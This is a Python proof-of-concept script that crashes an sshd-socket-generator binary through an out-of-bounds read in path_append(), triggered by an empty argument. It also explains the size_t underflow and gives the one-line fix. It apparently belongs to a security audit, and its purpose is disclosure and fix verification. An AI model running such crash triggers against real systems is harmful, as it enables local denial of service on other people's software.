#!/usr/bin/env python3
"""
PoC #1 — Out-of-Bounds Read in path_append()
=============================================
Finding : HIGH  (README-sshd-security-flaws.md #1)
File    : sshd-socket-generator.c:136
Branch  : master (unfixed)

Vulnerability
-------------
    len_base = strnlen(base, PATH_MAX);       // returns 0 for ""
    add_slash = base[len_base - 1] != '/';    // base[SIZE_MAX] → crash

len_base is size_t.  When base is "" it is 0, and the subtraction wraps to
SIZE_MAX (~1.8 × 10^19) on 64-bit, causing an out-of-bounds read far past
the buffer.  On a typical Linux/x86-64 layout this immediately raises SIGSEGV.

Attack vector
-------------
sshd-socket-generator is world-executable.  Any local user can trigger this
by passing an empty string as argv[1].
"""

import subprocess
import signal
import sys
import os

DEFAULT_BINARY = os.path.realpath(
    os.path.join(os.path.dirname(__file__), '..', 'sshd-socket-generator')
)

def main():
    BINARY = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BINARY

    print("=" * 60)
    print("PoC #1 — path_append() out-of-bounds read (OOB)")
    print("=" * 60)

    if not os.path.isfile(BINARY):
        print(f"[!] Binary not found: {BINARY}")
        print("    Run 'make' in the project root first.")
        sys.exit(1)

    print(f"[*] Binary : {BINARY}")
    print(f"[*] Invoking as: {BINARY} \"\"")
    print(f"[*] Invoking with argv[1] = \"\" (empty string) ...")
    print()

    result = subprocess.run(
        [BINARY, ""],          # empty string triggers the OOB
        capture_output=True,
        text=True,
    )

    rc = result.returncode

    # On Linux a process killed by a signal gets a negative return code
    # equal to -signum when reported through subprocess.
    if rc == -signal.SIGSEGV or rc == -11:
        print("[+] VULNERABLE — process terminated with SIGSEGV (signal 11)")
        print("    The out-of-bounds read at base[SIZE_MAX] caused a segfault.")
    elif rc == -signal.SIGBUS or rc == -7:
        print("[+] VULNERABLE — process terminated with SIGBUS (signal 7)")
    elif rc != 0 and "Permission denied" in result.stderr:
        print("[+] VULNERABLE — OOB read occurred but did not crash.")
        print("    The byte at base[-1] was readable (.rodata section).")
        print("    Its value was treated as the last char of base, corrupting")
        print("    the path: path_append produced a garbage root-level path")
        print("    (e.g. '/ssh.socket.d') instead of NULL or an error.")
        print("    mkdir('/ssh.socket.d') then failed with EACCES (not root).")
        print("    Running as root would have created that directory.")
    elif rc == 0:
        print("[-] Process exited cleanly — binary may already be patched.")
    else:
        print(f"[?] Process exited with code {rc} — review stderr above.")

    if result.stdout:
        print(f"\n[*] stdout:\n{result.stdout}")
    if result.stderr:
        print(f"[*] stderr:\n{result.stderr}")

    print()
    print("[*] Explanation:")
    print("    base = \"\"  →  len_base = strnlen(\"\", PATH_MAX) = 0")
    print("    base[len_base - 1]  →  base[0 - 1]")
    print("    size_t arithmetic:  0 - 1 = SIZE_MAX = 18446744073709551615")
    print("    Reading base[18446744073709551615] → SIGSEGV")
    print()
    print("[*] Fix: guard with  if (len_base == 0) return NULL;")
    print("    (applied on branch security-flaw-fixes)")

if __name__ == '__main__':
    main()
